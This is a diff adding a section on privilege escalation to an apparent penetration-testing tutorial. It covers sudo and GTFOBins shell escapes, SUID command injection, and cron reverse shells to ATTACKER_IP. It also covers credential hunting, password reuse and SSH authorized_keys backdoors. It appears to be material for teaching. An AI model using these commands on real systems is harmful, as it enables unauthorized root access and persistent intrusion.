@@ -1218,4 +1218,831 @@ $ id
 
 ---
 
+# PART 3: USER PRIVILEGES & CREDENTIAL EXPLOITATION
+
+## Vector 1: Sudo Privileges
+
+### What is Sudo?
+
+**Definition:**
+```
+sudo = "superuser do"
+Allows users to execute commands as different user
+Typically used to let unprivileged users run root commands
+Controlled via /etc/sudoers file
+```
+
+**Why It Matters:**
+```
+✓ Common misconfiguration
+✓ Can escalate to root directly
+✓ May not require password
+✓ One of easiest PrivEsc vectors
+```
+
+---
+
+### Checking Sudo Privileges
+
+**Command:**
+```bash
+sudo -l
+```
+
+**Example Output (Password Required):**
+```bash
+$ sudo -l
+[sudo] password for user:
+# (You need password - not useful for RCE access)
+```
+
+**Example Output (No Password Required):**
+```bash
+$ sudo -l
+Matching Defaults entries for user on target:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User user may run the following commands without password:
+    (root) NOPASSWD: /bin/echo
+    (root) NOPASSWD: /usr/bin/find
+    (www-data) NOPASSWD: /bin/cat
+
+# This is VULNERABLE!
+```
+
+---
+
+### Understanding Sudo Output
+
+**Format Breakdown:**
+
+```
+(user : user) NOPASSWD: /bin/echo
+ ↑     ↑      ↑        ↑
+ |     |      |        |
+ |     |      |        └─ Command that can be run
+ |     |      └─ NOPASSWD = don't need password
+ |     └─ Pseudo-user (who you run as)
+ └─ Real user (who you are)
+```
+
+**Examples:**
+
+```bash
+# Run /bin/echo as root, no password
+(root) NOPASSWD: /bin/echo
+→ Can execute: sudo /bin/echo
+
+# Run /usr/bin/find as www-data, no password
+(www-data) NOPASSWD: /usr/bin/find
+→ Can execute: sudo -u www-data /usr/bin/find
+
+# Run ALL commands as root with password
+(root) ALL
+→ Can execute anything, but needs password
+
+# Run specific command as specific user
+(www-data) NOPASSWD: /usr/bin/id
+→ Can execute: sudo -u www-data /usr/bin/id
+```
+
+---
+
+### Exploiting Sudo Privileges
+
+**If You Have NOPASSWD Sudo:**
+
+```
+1. Check what commands you can run
+   $ sudo -l
+
+2. Look for exploitable commands
+   - Can any command give you shell?
+   - Can any command read/write files?
+   - Can any command execute other commands?
+
+3. Use that command to escalate
+   $ sudo /bin/command arg1 arg2
+```
+
+---
+
+### GTFOBins: Finding Sudo Exploits
+
+**What is GTFOBins?**
+```
+GitHub repository: https://gtfobins.github.io
+List of Unix/Linux commands that can be exploited
+Shows HOW to exploit each command
+Includes shell escaping techniques
+```
+
+**How to Use:**
+
+```
+1. Find command you have sudo for
+   Example: /bin/find
+
+2. Visit GTFOBins and search "find"
+
+3. Look for "Sudo" section
+   Shows exact exploit command
+
+4. Copy the exploit command
+```
+
+---
+
+### Common Sudo Exploitation Examples
+
+**Example 1: Sudo with find**
+
+```bash
+$ sudo -l
+(root) NOPASSWD: /usr/bin/find
+
+# GTFOBins says:
+$ sudo find / -exec /bin/sh \; -quit
+root@target:~# id
+uid=0(root) gid=0(root) groups=0(root)
+# SUCCESS!
+```
+
+**Explanation:**
+```
+sudo find /        # Run find with sudo (as root)
+  -exec /bin/sh   # Execute shell when find matches
+  \; -quit        # After first match, quit
+# Result: Root shell!
+```
+
+---
+
+**Example 2: Sudo with less**
+
+```bash
+$ sudo -l
+(root) NOPASSWD: /usr/bin/less
+
+# GTFOBins says:
+$ sudo less /etc/passwd
+# Then inside less, type: !/bin/sh
+root@target:~# id
+uid=0(root) gid=0(root) groups=0(root)
+# SUCCESS!
+```
+
+**Explanation:**
+```
+less /etc/passwd   # Open file in less pager
+!/bin/sh           # Inside less, ! escapes to shell
+# Result: Root shell!
+```
+
+---
+
+**Example 3: Sudo with vi/vim**
+
+```bash
+$ sudo -l
+(root) NOPASSWD: /usr/bin/vim
+
+# GTFOBins says:
+$ sudo vim
+# Inside vim, type: :!/bin/sh
+root@target:~# id
+uid=0(root) gid=0(root) groups=0(root)
+# SUCCESS!
+```
+
+---
+
+### Using GTFOBins Effectively
+
+**Step-by-Step:**
+
+```
+1. Get your sudo privileges
+   $ sudo -l
+   Note: /usr/bin/find
+
+2. Go to https://gtfobins.github.io
+
+3. Search for "find"
+
+4. Find "Sudo" section (if exists)
+
+5. Copy the exact command
+
+6. Execute it
+
+7. You should get root shell
+```
+
+**What if Command Not on GTFOBins?**
+
+```
+Try these approaches:
+1. Search manually for the command + "PrivEsc"
+2. Read the command's man page for escape options
+3. Combine with other vectors (file write, etc.)
+4. Ask: "Can this read files? Write files? Execute?"
+```
+
+---
+
+### LOLBAS (Windows Equivalent)
+
+**What is LOLBAS?**
+```
+Windows version of GTFOBins
+Repository: https://lolbas-project.github.io
+Lists Windows built-in tools that can be abused
+Includes privilege escalation techniques
+```
+
+**Common Windows Tools:**
+```
+- rundll32.exe (execute DLLs)
+- powershell.exe (script execution)
+- reg.exe (registry modification)
+- wmic.exe (Windows Management Instrumentation)
+- msiexec.exe (Windows installer)
+```
+
+**Example: PowerShell PrivEsc**
+```powershell
+# Check what you can run
+whoami /priv
+
+# Or check UAC bypass techniques
+# Use LOLBAS to find exact exploit
+```
+
+---
+
+## Vector 2: SUID/SGID Binaries
+
+### What are SUID/SGID Files?
+
+**SUID (Set User ID):**
+```
+File permission that runs binary as OWNER, not executor
+Example: -rwsr-xr-x (note the 's')
+Runs as the file owner regardless of who runs it
+Typically owner is root
+```
+
+**SGID (Set Group ID):**
+```
+Similar to SUID but for groups
+Runs as the group owner instead of user
+Less common than SUID
+```
+
+---
+
+### Finding SUID/SGID Files
+
+**Command:**
+```bash
+# Find SUID files
+find / -perm -4000 2>/dev/null
+
+# Find SGID files
+find / -perm -2000 2>/dev/null
+
+# Find both
+find / -perm /4000 -o -perm /2000 2>/dev/null
+```
+
+**Example Output:**
+```
+-rwsr-xr-x 1 root root /usr/bin/passwd
+-rwsr-xr-x 1 root root /usr/bin/sudo
+-rwsr-xr-x 1 root root /usr/bin/ping
+-rwsr-xr-x 1 root root /bin/su
+```
+
+---
+
+### Exploiting SUID Binaries
+
+**Concept:**
+```
+If SUID binary is VULNERABLE
+You can exploit it to get root shell
+Because it runs as root
+```
+
+**Common Vulnerable SUID Binaries:**
+
+```
+✓ Custom applications (not standard Linux)
+✓ Old versions with known CVEs
+✓ Misconfigured binaries
+✗ Standard binaries (passwd, sudo, ping - patched)
+```
+
+---
+
+### SUID Exploitation Workflow
+
+**Step 1: Find SUID Binaries**
+```bash
+find / -perm -4000 2>/dev/null
+```
+
+**Step 2: Identify Non-Standard Binaries**
+```
+Standard binaries:
+- /usr/bin/passwd
+- /usr/bin/sudo
+- /bin/su
+- /usr/bin/ping
+
+Look for CUSTOM binaries:
+- /usr/local/bin/custom_app
+- /home/user/app
+- Custom programs
+```
+
+**Step 3: Test for Vulnerability**
+```bash
+# Check what it does
+strings /usr/local/bin/custom_app
+
+# Try to run it with special arguments
+/usr/local/bin/custom_app /etc/shadow
+
+# Try command injection
+/usr/local/bin/custom_app "; /bin/sh"
+```
+
+**Step 4: Exploit**
+```bash
+# If vulnerable to command injection:
+/usr/local/bin/custom_app "; /bin/sh"
+# Runs as root → root shell!
+```
+
+---
+
+## Vector 3: Scheduled Tasks & Cron Jobs
+
+### Linux: Cron Jobs
+
+**What are Cron Jobs?**
+```
+Scheduled tasks that run at specific times
+Run commands periodically (hourly, daily, weekly, etc.)
+Often run as root for system maintenance
+```
+
+**Common Cron Locations:**
+```
+/etc/crontab              - System-wide cron jobs
+/etc/cron.d/              - Additional system cron jobs
+/var/spool/cron/crontabs/ - User cron jobs
+~/.crontab               - User's personal cron
+```
+
+---
+
+### Exploiting Cron Jobs: Two Methods
+
+**Method 1: Write Malicious Cron Job**
+
+```
+If you can write to cron directories:
+1. Create bash script with reverse shell
+2. Add cron job that runs your script
+3. Wait for cron to execute
+4. Reverse shell connects back
+```
+
+**Process:**
+
+```bash
+# Step 1: Check if you can write to cron directory
+ls -la /etc/cron.d/
+# If writable, continue
+
+# Step 2: Create reverse shell script
+echo "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1" > /tmp/shell.sh
+
+# Step 3: Add cron job (if writable)
+echo "* * * * * root /tmp/shell.sh" >> /etc/cron.d/my_cron
+
+# Step 4: Wait for cron to run (usually within 1 minute)
+# Step 5: Receive reverse shell as root
+```
+
+---
+
+**Method 2: Modify Existing Cron Job**
+
+```
+If a root cron job exists that runs a script:
+1. Check if you can modify the script
+2. Add malicious code to existing script
+3. When cron runs, your code executes as root
+```
+
+**Process:**
+
+```bash
+# Step 1: Find existing cron jobs
+cat /etc/crontab
+
+# Example output:
+# 0 * * * * root /usr/local/bin/backup.sh
+
+# Step 2: Check if you can write to the script
+ls -la /usr/local/bin/backup.sh
+# If writable, continue
+
+# Step 3: Add reverse shell to script
+echo "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1" >> /usr/local/bin/backup.sh
+
+# Step 4: Wait for scheduled time
+# Step 5: Receive reverse shell as root
+```
+
+---
+
+### Windows: Scheduled Tasks
+
+**What are Scheduled Tasks?**
+```
+Windows equivalent of cron jobs
+Run programs at specific times
+Often run as SYSTEM (highest privilege)
+Managed through Task Scheduler
+```
+
+**Checking Scheduled Tasks:**
+```powershell
+# View all scheduled tasks
+Get-ScheduledTask
+
+# View task details
+Get-ScheduledTask -TaskName "BackupTask"
+
+# View task history
+Get-ScheduledTask -TaskName "BackupTask" | Get-ScheduledTaskInfo
+```
+
+---
+
+### Exploiting Windows Scheduled Tasks
+
+**If You Can Create New Task:**
+
+```powershell
+# Create new scheduled task
+$Action = New-ScheduledTaskAction -Execute "C:\reverse_shell.exe"
+$Trigger = New-ScheduledTaskTrigger -AtLogon
+Register-ScheduledTask -Action $Action -Trigger $Trigger -TaskName "Updates"
+
+# Task runs when someone logs in → Reverse shell
+```
+
+**If You Can Modify Existing Task:**
+
+```powershell
+# Modify existing task to run your payload
+Set-ScheduledTask -TaskName "Backup" `
+  -Action (New-ScheduledTaskAction -Execute "C:\evil.exe")
+
+# Next time task runs → Your code executes
+```
+
+---
+
+## Vector 4: Exposed Credentials
+
+### Finding Credentials in Files
+
+**Where Credentials Hide:**
+
+```
+Configuration Files:
+- /etc/mysql/mysql.conf.d/mysqld.cnf
+- /var/www/html/config.php
+- /app/settings.ini
+- ~/.ssh/config
+
+Log Files:
+- /var/log/apache2/access.log
+- /var/log/auth.log
+- /tmp/*.log
+
+History Files:
+- ~/.bash_history (Linux)
+- $PROFILE (PowerShell history - Windows)
+- ~/.zsh_history
+```
+
+---
+
+### Real Example: Found Database Credentials
+
+**Scenario:**
+```
+Running LinPEAS on target
+Finds configuration file with hardcoded password
+```
+
+**Example Output:**
+```
+[+] Searching passwords in config PHP files
+/var/www/html/config.php: $conn = new MySQL('localhost', 'db_user', 'password123');
+```
+
+**Exploitation:**
+
+```bash
+# Step 1: Note the credentials
+# Username: db_user
+# Password: password123
+
+# Step 2: Try password reuse (user might use same password)
+$ su - root
+Password: password123
+$ whoami
+root
+# SUCCESS!
+```
+
+---
+
+### Password Reuse Exploitation
+
+**Concept:**
+```
+Users often reuse passwords across systems
+Database password = User password = Root password
+```
+
+**Process:**
+
+```bash
+# Step 1: Find password in config file
+$ grep password /var/www/html/config.php
+password123
+
+# Step 2: Try to switch to root user
+$ su - root
+Password: password123
+
+# Step 3: Check if you're root
+$ whoami
+root
+
+# Step 4: Success!
+$ id
+uid=0(root) gid=0(root)
+```
+
+---
+
+### Checking History Files
+
+**Linux Bash History:**
+```bash
+cat ~/.bash_history
+cat /root/.bash_history  # If readable
+
+# Look for:
+# - mysql -u root -p password
+# - ssh root@...
+# - Commands with credentials
+```
+
+**PowerShell History (Windows):**
+```powershell
+type $PROFILE\ConsoleHost_history.txt
+# Or
+Get-History
+
+# Look for passwords, API keys, credentials
+```
+
+---
+
+## Vector 5: SSH Key Exploitation
+
+### Reading Private SSH Keys
+
+**What are SSH Keys?**
+```
+Private keys: Like passwords for SSH (stored in ~/.ssh/id_rsa)
+Public keys: Safe to share (stored in ~/.ssh/id_rsa.pub)
+If you read someone's private key → You can log in as them
+```
+
+---
+
+### Stealing Existing SSH Keys
+
+**Finding SSH Keys:**
+
+```bash
+# User SSH keys
+cat /home/user/.ssh/id_rsa
+
+# Root SSH keys
+cat /root/.ssh/id_rsa
+
+# Check if readable
+ls -la /root/.ssh/
+```
+
+---
+
+### Using Stolen SSH Keys
+
+**On Your Attacker Machine:**
+
+```bash
+# Step 1: Copy the private key
+# (You got it from reading /root/.ssh/id_rsa)
+vim id_rsa
+# Paste the key contents
+
+# Step 2: Fix permissions (SSH requires 600)
+chmod 600 id_rsa
+
+# Step 3: SSH using the key
+ssh -i id_rsa root@TARGET_IP
+
+# Step 4: You're logged in as root!
+root@target:~# id
+uid=0(root) gid=0(root)
+```
+
+---
+
+### Creating SSH Key Persistence
+
+**Goal:**
+```
+Gain SSH access that persists after you disconnect
+Create permanent backdoor
+Use your own key so no password needed
+```
+
+---
+
+### Method 1: If You Have File Write Access
+
+**Scenario:**
+```
+You have shell as www-data
+You have write access to /root/.ssh/
+You want persistent SSH access
+```
+
+**Process:**
+
+```bash
+# Step 1: On ATTACKER MACHINE - Generate your key pair
+ssh-keygen -f key
+# Creates: key (private) and key.pub (public)
+
+# Step 2: Copy the PUBLIC key to clipboard
+cat key.pub
+# AAAAB3NzaC1yc2EAAAADAQABAAABgQDk...
+
+# Step 3: On TARGET MACHINE - Add your public key to authorized_keys
+echo "AAAAB3NzaC1yc2EAAAADAQABAAABgQDk..." >> /root/.ssh/authorized_keys
+
+# Step 4: Back on ATTACKER MACHINE - SSH with your private key
+ssh -i key root@TARGET_IP
+
+# Step 5: You're logged in as root!
+root@target:~#
+```
+
+---
+
+### Step-by-Step SSH Key Installation
+
+**On Attacker Machine (Generate Key):**
+
+```bash
+# Step 1: Generate key pair
+$ ssh-keygen -f key
+Generating public/private rsa key pair.
+Enter passphrase (empty for no passphrase): [press Enter]
+Your identification has been saved in key
+Your public key has been saved in key.pub
+
+# Step 2: Check the files
+$ ls -la key*
+-rw------- 1 user user 1679 Jan 25 10:30 key
+-rw-r--r-- 1 user user  401 Jan 25 10:30 key.pub
+
+# Step 3: Display public key (for copying)
+$ cat key.pub
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDk...SNIP...M=user@attacker
+```
+
+---
+
+**On Target Machine (Install Public Key):**
+
+```bash
+# Step 1: As the compromised user (www-data with write to /root/.ssh/)
+$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDk...SNIP...M=user@attacker" >> /root/.ssh/authorized_keys
+
+# Step 2: Verify it was added
+$ cat /root/.ssh/authorized_keys
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDk...SNIP...M=user@attacker
+
+# Step 3: Fix permissions (if needed)
+chmod 600 /root/.ssh/authorized_keys
+chmod 700 /root/.ssh/
+```
+
+---
+
+**Back on Attacker Machine (Login):**
+
+```bash
+# Step 1: SSH using your private key
+$ ssh -i key root@TARGET_IP
+
+# Step 2: No password needed! (SSH key authentication)
+root@target:~# 
+
+# Step 3: You're logged in as root!
+root@target:~# id
+uid=0(root) gid=0(root) groups=0(root)
+
+# Step 4: Persistent access - you can reconnect anytime
+# Even if other shells die, SSH key still works
+```
+
+---
+
+## SSH Key Security Note
+
+**Why chmod 600?**
+
+```
+SSH keys must have restrictive permissions
+If readable by other users → SSH refuses to use key
+
+Correct permissions:
+- Private key: 600 (-rw-------)
+- .ssh directory: 700 (drwx------)
+- authorized_keys: 600 (-rw-------)
+```
+
+---
+
+## Key Takeaways - Part 3: User Privileges & Credentials
+
+1. **Sudo Privileges:**
+   - Check with `sudo -l`
+   - Look for NOPASSWD entries
+   - Use GTFOBins to find exploits
+   - Often easiest PrivEsc vector
+
+2. **SUID/SGID Binaries:**
+   - Find with `find / -perm -4000`
+   - Exploit custom/vulnerable binaries
+   - Standard binaries usually patched
+   - Look for command injection flaws
+
+3. **Scheduled Tasks (Linux/Windows):**
+   - Linux: Cron jobs in /etc/cron.d/, /etc/crontab
+   - Windows: Scheduled tasks via Task Scheduler
+   - Two exploitation methods: Create new or modify existing
+   - Wait for scheduled time to execute
+
+4. **Exposed Credentials:**
+   - Check config files for hardcoded passwords
+   - Check history files for reused passwords
+   - Try password reuse across accounts
+   - Often leads to direct root access
+
+5. **SSH Keys:**
+   - Reading private keys = SSH access
+   - Create key pair on attacker machine
+   - Install public key in authorized_keys
+   - Persistent access without passwords
+   - Must use chmod 600 for permissions
+
+6. **Strategic Priority:**
+   - Sudo → Fastest if NOPASSWD
+   - Credentials → Easiest if found
+   - SSH Keys → Most persistent
+   - Cron → Reliable but requires waiting
+   - SUID → Depends on availability
+
+---
+
 ## Notes
